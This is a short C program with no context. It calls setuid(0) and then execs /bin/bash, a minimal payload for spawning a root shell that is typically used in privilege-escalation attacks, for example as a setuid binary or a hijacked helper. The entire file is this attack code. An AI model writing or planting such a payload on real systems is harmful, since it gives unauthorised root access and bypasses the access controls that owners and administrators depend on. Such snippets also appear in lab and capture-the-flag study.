#include <unistd.h>
int main()
{
    setuid(0);
    char* argv[3] = {"/bin/bash", NULL, NULL};
    execve("/bin/bash", argv, NULL);
}